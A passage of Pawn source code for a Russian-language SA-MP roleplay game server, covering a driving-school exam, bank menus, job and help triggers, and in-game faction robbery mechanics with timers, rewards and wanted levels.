		timestamp2 += 31536000;
		if ( ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0) )  timestamp2 += 86400;
	}

	return timestamp2;
}
stock Now() {
	new hour,minute,second;
	new year, month,day;
	gettime(hour, minute, second);
	getdate(year, month, day);
	return mktimes(hour,minute,second,day,month,year);
}

publics: OnCheckTrigger()
{
	foreach(i)
	{
		if(TriggerStatus[i] == 1) return 1; // Если этого не будет, то он будет флудить вашей функцией
		if(IsPlayerInRangeOfPoint(i,2.0,2355.255127,1676.049561,3039.100098)) // x y z заменяем на то где стоит наш триггер и устанавливаем виртуальный мир в каком мире он будет срабатывать, можете удалить, но будет работать триггер во всех вирт мирах
		{
				TriggerStatus[i] = 1; TriggerPos[i][0] = 2355.255127; TriggerPos[i][1] = 1676.049561; TriggerPos[i][2] = 3039.100098; // Ставим свои координаты x y z что бы триггер мог установить значение 0, когда игрок отойдет от него
				if(PlayerInfo[i][pCarLic] == 1)
				{
				    if(PlayerInfo[i][pQuestL] == 1 && PlayerInfo[i][pQuest] == 2)
					{
								PlayerPlaySound(i, 4201, 0.0, 0.0, 0);
								ShowPlayerDialogEx(i,13372,DIALOG_STYLE_MSGBOX,"Задание","Тут неподалёку есть ферма,где можно неплохо заработать.\nМожешь использовать gps или найти таксиста и попросить его отвезти тебя.\nЕсли ты сможешь за раз собрать 25 кустов урожая,то я поделюсь с тобой своей прибылью\n{DDCD70}Задача: Собрать 30 единиц урожая\n{17B757}Награда: 2000 вирт"
								,"Готово","");
								PlayerInfo[i][pQuest] = 3;
								PlayerInfo[i][pQuestP] = 0;
								PlayerInfo[i][pQuestPF] = 30;
								SendClientMessage(i,0x30a0a7aa," Задание выполнено");
								mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
						        PlayerInfo[i][pQuest], PlayerInfo[i][pQuestP], PlayerInfo[i][pQuestPF], PlayerInfo[i][pName]);
					            mysql_function_query(DATABASE,QUERY,false,"","");
				    }
				    return SendClientMessage(i, COLOR_GRAD1, " Вы уже имеете водительские права");
				}
			    if(GetPVarInt(i,"givecarlic") == 2)
			    {
 						SendClientMessage(i, -1, " Извините! Вы недостаточно хорошо ездиете, чтобы получить водительские права!");
 						SendClientMessage(i, -1, " Пересдать экзамен можно в любое время.");
 						SendClientMessage(i, -1, " Мы настоятельно рекомендуем вам прочесть ПДД");
						LessonCar[i] = 0;
						LessonStat[i] = 0;
						TakingLesson[i] = 0;
						DeletePVar(i,"givecarlic");
				}
				else if(GetPVarInt(i,"givecarlic") == 1)
				{
						LessonCar[i] = 0;
						LessonStat[i] = 0;
						TakingLesson[i] = 0;
						PlayerInfo[i][pCarLic] = 1;
						SendClientMessage(i, -1, " Поздравляем вас! Вы сдали экзамен по вождению");
						SendClientMessage(i, COLOR_GREEN, " Подсказка: Теперь вы можете устроить на работу в Мэрии << Испльзуйте /GPS >>");
						SendClientMessage(i, COLOR_GREEN, " Подсказка: Работа водителя автобуса очень интересная и прибыльная (зарплата государства + деньги за билеты)");
						SendClientMessage(i, -1, " Мы рекомендуем вам поработать пару лет (( 2 левла )), а после вступить в организацию");
						DeletePVar(i,"givecarlic");
						mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCarLic = '%i' WHERE name = '%e'", PlayerInfo[i][pCarLic], PlayerInfo[i][pName]);
	                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
				if(PlayerInfo[i][pQuestL] == 1 && PlayerInfo[i][pQuest] == 2)
				{
							PlayerPlaySound(i, 4201, 0.0, 0.0, 0);
							ShowPlayerDialogEx(i,13372,DIALOG_STYLE_MSGBOX,"Задание","Тут неподалёку есть ферма,где можно неплохо заработать.\nМожешь использовать gps или найти таксиста и попросить его отвезти тебя.\nЕсли ты сможешь за раз собрать 25 кустов урожая,то я поделюсь с тобой своей прибылью\n{DDCD70}Задача: Собрать 30 единиц урожая\n{17B757}Награда: 2000 вирт"
							,"Готово","");
							PlayerInfo[i][pQuest] = 3;
							PlayerInfo[i][pQuestP] = 0;
							PlayerInfo[i][pQuestPF] = 30;
							SendClientMessage(i,0x30a0a7aa," Задание выполнено");
							mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
                            PlayerInfo[i][pQuest], PlayerInfo[i][pQuestP], PlayerInfo[i][pQuestPF], PlayerInfo[i][pName]);
                            mysql_function_query(DATABASE,QUERY,false,"","");
				}
				else ShowPlayerDialogEx(i,10022,DIALOG_STYLE_MSGBOX, "Экзамен по вождению","Приветствуем вас в Автошколе.\nЕсли вы хотите сдать на права, нажмите Далее", "Далее", "Отмена");
				return true;
		}
		else if(IsPlayerInRangeOfPoint(i,2.0,864.6805,322.7838,1078.4357-1.77)) // x y z заменяем на то где стоит наш триггер и устанавливаем виртуальный мир в каком мире он будет срабатывать, можете удалить, но будет работать триггер во всех вирт мирах
		{
			if(useguns[i] == 0)
			{
			//	if(BGet(i)) return SendClientMessage(i, COLOR_GRAD1, "Бизнесмен не может устроиться на работу");
				ShowPlayerDialogEx(i, 10092, DIALOG_STYLE_MSGBOX, "Приём на работу", "Вы хотите просмотреть список доступных работ?", "Да", "Нет");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 864.6805; TriggerPos[i][1] = 322.7838; TriggerPos[i][2] = 1078.4357-1.77; // Ставим свои координаты x y z что бы триггер мог установить значение 0, когда игрок отойдет от него
				return true;
			}
		}
		else if(IsPlayerInRangeOfPoint(i,1.0,1160.4260,-1770.3188,16.5938)) // x y z заменяем на то где стоит наш триггер и устанавливаем виртуальный мир в каком мире он будет срабатывать, можете удалить, но будет работать триггер во всех вирт мирах
		{
				SetPVarInt(i,"help_dialog",0), ShowPlayerDialogEx(i, 1467, 0, "Помощь","Здравствуйте, я объясню Вам как играть на этом сервере.\nЧто вам делать, куда идти в данный момент", "Далее", "Отмена");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 1160.4260; TriggerPos[i][1] = -1770.3188; TriggerPos[i][2] = 16.5938; // Ставим свои координаты x y z что бы триггер мог установить значение 0, когда игрок отойдет от него
				return true;
		}
		else if(IsPlayerInRangeOfPoint(i,2.0,1398.002808,-1693.363281,37.794899))
		{
			if(IsABank(i))
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[i][pBank]);
				ShowPlayerDialogEx(i, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 1398.002808; TriggerPos[i][1] = -1693.363281; TriggerPos[i][2] = 37.794899;
				return true;
			}
		}
		else if(IsPlayerInRangeOfPoint(i,2.0,1395.500732,-1693.363281,37.794899))
		{
		    if(IsABank(i))
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[i][pBank]);
				ShowPlayerDialogEx(i, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 1395.500732; TriggerPos[i][1] = -1693.363281; TriggerPos[i][2] = 37.794899;
				return true;
			}
		}
		else if(IsPlayerInRangeOfPoint(i,2.0,1400.531738,-1693.363281,37.794899))
		{
		    if(IsABank(i))
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[i][pBank]);
				ShowPlayerDialogEx(i, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 1400.531738; TriggerPos[i][1] = -1693.363281; TriggerPos[i][2] = 37.794899;
				return true;
			}
		}
		else if(IsPlayerInRangeOfPoint(i,2.0,1392.902954,-1693.363281,37.794899))
		{
		    if(IsABank(i))
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[i][pBank]);
				ShowPlayerDialogEx(i, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 1392.902954; TriggerPos[i][1] = -1693.363281; TriggerPos[i][2] = 37.794899;
				return true;
			}
		}
		else if(IsPlayerInRangeOfPoint(i,2.0,1403.054321,-1693.363281,37.794899))
		{
		    if(IsABank(i))
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[i][pBank]);
				ShowPlayerDialogEx(i, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				TriggerStatus[i] = 1; TriggerPos[i][0] = 1403.054321; TriggerPos[i][1] = -1693.363281; TriggerPos[i][2] = 37.794899;
				return true;
			}
		}
	}
	return 1;
}
publics: RobTickRTSC(playerid, tip ,member, Robsid, act)
{
	if(RobTickRTC[playerid] != -1)
	{
        RobTickRTC[playerid]--;
        if(RobTickRTC[playerid] == -1)
        {
		    if(robscdtimer[playerid] != -1)
		    {
			    KillTimer(robscdtimer[playerid]);
			    robscdtimer[playerid] = -1;
			    RobTickRTC[playerid] = 0;
		    }
		    PlayerTextDrawHide(playerid,robsdraw[playerid]);
            RobSuccessFilly(playerid, tip ,member, Robsid, act);
        }
        else
        {
            PlayerTextDrawShow(playerid,robsdraw[playerid]);
            ApplyActorAnimation(act, "INT_HOUSE", "wash_up",4.1,0,0,0,1,0);
			switch(RobTickRTC[playerid])
			{
                case 29: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIIIIIIIII~w~I~b~]");
                case 28: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIIIIIIII~w~II~b~]");
                case 27: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIIIIIII~w~III~b~]");
                case 26: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIIIIII~w~IIII~b~]");
                case 25: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIIIII~w~IIIII~b~]");
                case 24: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIIII~w~IIIIII~b~]");
                case 23: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIIII~w~IIIIIII~b~]");
                case 22: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIIII~w~IIIIIIII~b~]");
                case 21: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIIII~w~IIIIIIIII~b~]");
                case 20: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIIII~w~IIIIIIIIII~b~]");
                case 19: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIIII~w~IIIIIIIIIII~b~]");
                case 18: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIIII~w~IIIIIIIIIIII~b~]");
                case 17: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIIII~w~IIIIIIIIIIIII~b~]");
                case 16: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIIII~w~IIIIIIIIIIIIII~b~]");
                case 15: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIIII~w~IIIIIIIIIIIIIII~b~]");
                case 14: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIIII~w~IIIIIIIIIIIIIIII~b~]");
                case 13: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIIII~w~IIIIIIIIIIIIIIIII~b~]");
                case 12: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIIII~w~IIIIIIIIIIIIIIIIII~b~]");
                case 11: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIIII~w~IIIIIIIIIIIIIIIIIII~b~]");
                case 10: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIIII~w~IIIIIIIIIIIIIIIIIIII~b~]");
                 case 9: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIIII~w~IIIIIIIIIIIIIIIIIIIII~b~]");
                 case 8: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIIII~w~IIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 7: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIIII~w~IIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 6: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIIII~w~IIIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 5: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIIII~w~IIIIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 4: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[IIII~w~IIIIIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 3: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[III~w~IIIIIIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 2: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[II~w~IIIIIIIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 1: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[I~w~IIIIIIIIIIIIIIIIIIIIIIIIIIIII~b~]");
                 case 0: PlayerTextDrawSetString(playerid,robsdraw[playerid], "~b~[~w~IIIIIIIIIIIIIIIIIIIIIIIIIIIIII~b~]");
            }
        }
    }
    return 0;
}
stock RobSuccessFilly(pids, tip ,member, robin, act)
{
    ClearActorAnimations(ActorsRob[act]);
	if(tip == 0)
	{
		new maxform;
		foreach(i)
		{
			if(maxform >= 4) break;
		    else if(PlayerToPoint(30,i,204.8515,-8.1603,1001.2109) && PlayerInfo[i][pMember] == member && RobInts[i] == robin)
		    {
	            if(PlayerInfo[i][pSex] == 2) SetPlayerSkin(i, 191);
	            else SetPlayerSkin(i, 287);
	            proverkaforma[i] = 1;
	            maxform++;
			}
		}
	}
	else if(tip == 1)
	{
		if(PlayerInfo[pids][pMember] == 5)
		{
			lcnmats += 2500;
			if(lcnmats > 100000) lcnmats = 100000;
		}
		else if(PlayerInfo[pids][pMember] == 6)
		{
			yakuzamats += 2500;
			if(yakuzamats > 100000) yakuzamats = 100000;
		}
		else if(PlayerInfo[pids][pMember] == 14)
		{
			rmmats += 2500;
			if(rmmats > 100000) rmmats = 100000;
		}
		SendClientMessage(pids, -1, " На склад вашей мафии добавлено 2500 материалов");
	}
	else if(tip == 2)
	{
	    foreach(i)
		{
		    if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && PlayerInfo[i][pMember] == member && RobInts[i] == robin)
		    {
				PlayerInfo[i][pDrugs] = 150;
				SCM(i, 0x6495EDFF, " Вы получили 150 грам наркотиков");
			}
		}
	}
	return 0;
}
publics: RobsEnabledCD(ids)
{
    if(cdrob[ids] != true) return 0;
    cdrob[ids] = false;
    return 0;
}
stock wantedsrobfriend(fraks, reason, introb)
{
	foreach(i)
	{
		if(reason == 0)
		{
			if(PlayerToPoint(30,i,204.8515,-8.1603,1001.2109) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление Victim LS");
			}
		}
		else if(reason == 1)
		{
			if(PlayerToPoint(30,i,204.8515,-8.1603,1001.2109) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление Victim SF");
			}
		}
		else if(reason == 2)
		{
			if(PlayerToPoint(30,i,316.1089,-133.7254,999.6016) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление Ammo LV");
			}
		}
		else if(reason == 3)
		{
			if(PlayerToPoint(30,i,295.4810,-40.2167,1001.5156) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление Ammo SF");
			}
		}
		else if(reason == 5)
		{
			if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление больницы [SFMC]");
			}
		}
		else if(reason == 6)
		{
			if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление больницы [ASGH]");
			}
		}
		else if(reason == 7)
		{
			if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление больницы [LVMC]");
			}
		}
		else if(reason == 8)
		{
			if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление больницы [FCMC]");
			}
		}
		else if(reason == 9)
		{
			if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && PlayerInfo[i][pMember] == fraks && RobInts[i] == introb)
			{
    			if(PlayerInfo[i][pWantedLevel] > 3) PlayerInfo[i][pWantedLevel] += 1;
    			else PlayerInfo[i][pWantedLevel] += 3;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel]);
				SetPlayerCriminal(i,"Неизвестный", "Ограбление больницы [CGH]");
			}
		}
	}
	return 0;
}
publics: RobbingTimer()
{
	for(new ac = 0; ac < 9; ac++) SetActorHealth(ActorsRob[ac], 255);
    new pl[10][8];
	foreach(i)
	{
		if(GetPlayerInterior(i) == 5)
		{
			if(PlayerToPoint(30,i,204.8515,-8.1603,1001.2109) && RobInts[i] == 3)// Victim SF
			{
           	 	if(cdrob[1] == false)
                {
            		switch(PlayerInfo[i][pMember])
            		{
						case 12: pl[1][0]++;
						case 13: pl[1][1]++;
						case 15: pl[1][2]++;
						case 17: pl[1][3]++;
						case 18: pl[1][4]++;
						default: continue;
            		}
		    		new PTA = GetPlayerCameraTargetActor(i),
						keys,
						updown,
						leftright;
                	GetPlayerKeys(i, keys, updown, leftright);
    	    		if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    		{
						if(PTA != ActorsRob[4]) continue;
                		new PW = GetPlayerWeapon(i);
                		if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                		{
							if(pl[1][0] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[1] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",1);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 3, ActorsRob[4]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 1, 3);
                        	}
							else if(pl[1][1] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[1] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",1);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 3, ActorsRob[4]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 1, 3);
                        	}
							else if(pl[1][2] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[1] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",1);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 3, ActorsRob[4]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 1, 3);
                        	}
							else if(pl[1][3] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[1] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",1);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 3, ActorsRob[4]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 1, 3);
                        	}
							else if(pl[1][4] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[1] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",1);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 3, ActorsRob[4]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 1, 3);
                        	}
                        	else
                        	{
                        		SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        	}
                		}
            		}
            	}
            	continue;
			}
			else if(PlayerToPoint(30,i,204.8515,-8.1603,1001.2109) && RobInts[i] == 4) // Victim LS
			{
                if(cdrob[0] == false)
                {
            		switch(PlayerInfo[i][pMember])
            		{
						case 12: pl[0][0]++;
						case 13: pl[0][1]++;
						case 15: pl[0][2]++;
						case 17: pl[0][3]++;
						case 18: pl[0][4]++;
						default: continue;
            		}
		    		new PTA = GetPlayerCameraTargetActor(i),
		    		    keys,
						updown,
						leftright;
                	GetPlayerKeys(i, keys, updown, leftright);
    	    		if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    		{
                        if(PTA != ActorsRob[3]) continue;
                		new PW = GetPlayerWeapon(i);
                		if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                		{
							if(pl[0][0] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[0] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",0);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 4, ActorsRob[3]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 0, 4);
                        	}
							else if(pl[0][1] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[0] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",0);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 4, ActorsRob[3]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 0, 4);
                        	}
							else if(pl[0][2] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[0] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",0);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 4, ActorsRob[3]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 0, 4);
                        	}
							else if(pl[0][3] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[0] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",0);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 4, ActorsRob[3]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 0, 4);
                        	}
							else if(pl[0][4] > 1)
							{
                        		ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            	cdrob[0] = true;
                            	SetTimerEx("RobsEnabledCD", 1800000, false, "d",0);
                            	RobTickRTC[i] = 30;
                            	robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 0, PlayerInfo[i][pMember], 4, ActorsRob[3]);
                            	wantedsrobfriend(PlayerInfo[i][pMember], 0, 4);
                        	}
                        	else
                        	{
                        		SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        	}
                		}
            		}
            	}
            	continue;
			}
		}
		else if(PlayerToPoint(30,i,316.1089,-133.7254,999.6016) && RobInts[i] == 0)
		{
            if(cdrob[2] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 5: pl[2][5]++;
					case 6: pl[2][6]++;
					case 14: pl[2][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[2]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[2][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[2] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",2);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 0, ActorsRob[2]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 2, 0);
                        }
						else if(pl[2][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[2] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",2);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 0, ActorsRob[2]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 2, 0);
                        }
						else if(pl[2][7] > 1)
						{
